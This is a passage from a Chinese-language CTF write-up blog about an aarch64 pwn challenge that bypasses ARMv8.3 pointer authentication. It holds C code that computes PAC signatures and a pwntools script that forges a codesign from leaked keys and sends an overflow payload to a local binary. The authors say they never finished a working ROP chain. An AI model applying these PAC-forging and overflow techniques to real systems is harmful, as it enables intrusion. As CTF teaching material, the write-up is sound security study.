+</span></span><span style=display:flex><span>    sscanf(argv[<span style=color:#40a070>2</span>], <span style=color:#4070a0>&#34;%llx&#34;</span>, <span style=color:#666>&amp;</span>api2);
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> pc <span style=color:#666>=</span> atoll(argv[<span style=color:#40a070>3</span>]);
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> sp <span style=color:#666>=</span> atoll(argv[<span style=color:#40a070>4</span>]);
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> ext <span style=color:#666>=</span> sextract64(pc, <span style=color:#40a070>55</span>, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> ext_ptr <span style=color:#666>=</span> deposit64(pc, <span style=color:#40a070>48</span>, <span style=color:#40a070>56</span> <span style=color:#666>-</span> <span style=color:#40a070>48</span>, ext);
+</span></span><span style=display:flex><span>        <span style=color:#902000>uint64_t</span> ans <span style=color:#666>=</span>          pauth_computepac_architected(ext_ptr, sp,
+</span></span><span style=display:flex><span>                        api1,api2)<span style=color:#666>&amp;</span><span style=color:#40a070>0x00ff000000000000</span> <span style=color:#666>|</span> pc;
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> test <span style=color:#666>=</span> sextract64(pc, <span style=color:#40a070>48</span>, <span style=color:#40a070>56</span> <span style=color:#666>-</span> <span style=color:#40a070>48</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (test <span style=color:#666>!=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> test <span style=color:#666>!=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        ans <span style=color:#666>^=</span> MAKE_64BIT_MASK(<span style=color:#40a070>56</span> <span style=color:#666>-</span> <span style=color:#40a070>2</span>, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    ans <span style=color:#666>&amp;=</span> MAKE_64BIT_MASK(<span style=color:#40a070>48</span>, <span style=color:#40a070>7</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ext <span style=color:#666>&amp;=</span> MAKE_64BIT_MASK(<span style=color:#40a070>55</span>, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;%llx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, ans <span style=color:#666>|</span> ext <span style=color:#666>|</span> pc);
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//      printf(&#34;%llx\n&#34;, 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//                      pauth_computepac_architected(pc, sp,
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//                      api1,api2));
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
+</span></span></code></pre></div><p>然后我们在攻击的时候直接通过该程序计算即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#!/usr/bin/env python
+</span></span></span><span style=display:flex><span><span style=color:#007020># coding=utf-8
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>from pwn import <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span>import subprocess
+</span></span><span style=display:flex><span>context.log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context.terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>#sh = process(&#34;./pwn&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>sh <span style=color:#666>=</span> process([<span style=color:#4070a0>&#34;qemu-aarch64&#34;</span>, <span style=color:#4070a0>&#34;-g&#34;</span>, <span style=color:#4070a0>&#34;2222&#34;</span>, <span style=color:#4070a0>&#34;-L&#34;</span>, <span style=color:#4070a0>&#34;./quiet-aarch64/aarch642.0&#34;</span>, <span style=color:#4070a0>&#34;./pwn-patched&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./pwn&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#007020>#sh = process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./quiet-aarch64/aarch642.0&#34;, &#34;./pwn&#34;])
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>key1 <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>key2 <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def calc_sign(sp)<span style=color:#666>:</span>
+</span></span><span style=display:flex><span>    p <span style=color:#666>=</span> subprocess.Popen([<span style=color:#4070a0>&#34;./a&#34;</span>, hex(key2), hex(key1), str(<span style=color:#40a070>0x61616161</span>), str(sp)], stdout <span style=color:#666>=</span> subprocess.PIPE)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.2</span>)
+</span></span><span style=display:flex><span>    ans <span style=color:#666>=</span> <span style=color:#902000>int</span>(p.stdout.read(), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>    print hex(ans)
+</span></span><span style=display:flex><span>    p.terminate()
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> ((ans) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>48</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def calc_addr(sp, pc)<span style=color:#666>:</span>
+</span></span><span style=display:flex><span>    p <span style=color:#666>=</span> subprocess.Popen([<span style=color:#4070a0>&#34;./a&#34;</span>, hex(key2), hex(key1), str(pc), str(sp)], stdout <span style=color:#666>=</span> subprocess.PIPE)
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>0.2</span>)
+</span></span><span style=display:flex><span>    ans <span style=color:#666>=</span> <span style=color:#902000>int</span>(p.stdout.read(), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>    print hex(ans)
+</span></span><span style=display:flex><span>    p.terminate()
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> ((ans) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>48</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.recvuntil(<span style=color:#4070a0>&#34;[+] YOUR GIFT APIA KEY: &#34;</span>)
+</span></span><span style=display:flex><span>key1 <span style=color:#666>=</span> <span style=color:#902000>int</span>(sh.recvuntil(<span style=color:#4070a0>&#39;,&#39;</span>, drop <span style=color:#666>=</span> True), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>key2 <span style=color:#666>=</span> <span style=color:#902000>int</span>(sh.recvuntil(<span style=color:#4070a0>&#39;\n&#39;</span>, drop <span style=color:#666>=</span> True), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>log.success(hex(key1))
+</span></span><span style=display:flex><span>log.success(hex(key2))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>codesign <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i in range(<span style=color:#40a070>4</span>)<span style=color:#666>:</span>
+</span></span><span style=display:flex><span>    codesign <span style=color:#666>=</span> codesign <span style=color:#666>+</span> calc_sign(<span style=color:#40a070>0x1337</span> <span style=color:#666>+</span> i)
+</span></span><span style=display:flex><span>    codesign <span style=color:#666>=</span> codesign <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>    codesign <span style=color:#666>=</span> codesign <span style=color:#666>+</span> calc_sign(<span style=color:#40a070>0x1337</span> <span style=color:#666>+</span> i)
+</span></span><span style=display:flex><span>    codesign <span style=color:#666>=</span> codesign <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>codesign <span style=color:#666>=</span> codesign <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>log.success(<span style=color:#4070a0>&#34;sign: &#34;</span> <span style=color:#666>+</span> hex(codesign))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.sendlineafter(<span style=color:#4070a0>&#34;length:&#34;</span>, str(<span style=color:#40a070>256</span>))
+</span></span><span style=display:flex><span><span style=color:#007020>#sh.sendlineafter(&#34;Data:&#34;, &#39;a&#39; * 0x100)
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>sh.sendafter(<span style=color:#4070a0>&#34;Data:&#34;</span>, <span style=color:#4070a0>&#34;a&#34;</span>.ljust(<span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;a&#39;</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;\xFF&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.sendafter(<span style=color:#4070a0>&#34;[0/1]&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh.sendafter(<span style=color:#4070a0>&#34;codesign:&#34;</span>, p64(codesign) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;\x00&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.recvuntil(<span style=color:#4070a0>&#34;Your old data&#34;</span>)
+</span></span></code></pre></div><p>如此即可到达栈溢出漏洞点。</p><p>到达栈溢出点后，开始 rop 的第一个返回地址要先通过一个 AUTIASP，可是此处的 sp 不可预知。我们没有想到比较好的方法，选择直接爆破 PAC 码，因为没有开启 PIE，所以所有地址有效位都不超过 32， PAC 码仅有 8 位，爆破概率 1/256，通过这个之后，就是普通的 rop 了。遗憾的是我们当时并没有写出可用的 rop 链，因为 aarch64 的 gadget 都比较难以使用。</p><h3 id=reference>reference</h3><blockquote><p><a href=https://www.qualcomm.com/media/documents/files/whitepaper-pointer-authentication-on-armv8-3.pdf>https://www.qualcomm.com/media/documents/files/whitepaper-pointer-authentication-on-armv8-3.pdf</a></p></blockquote></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
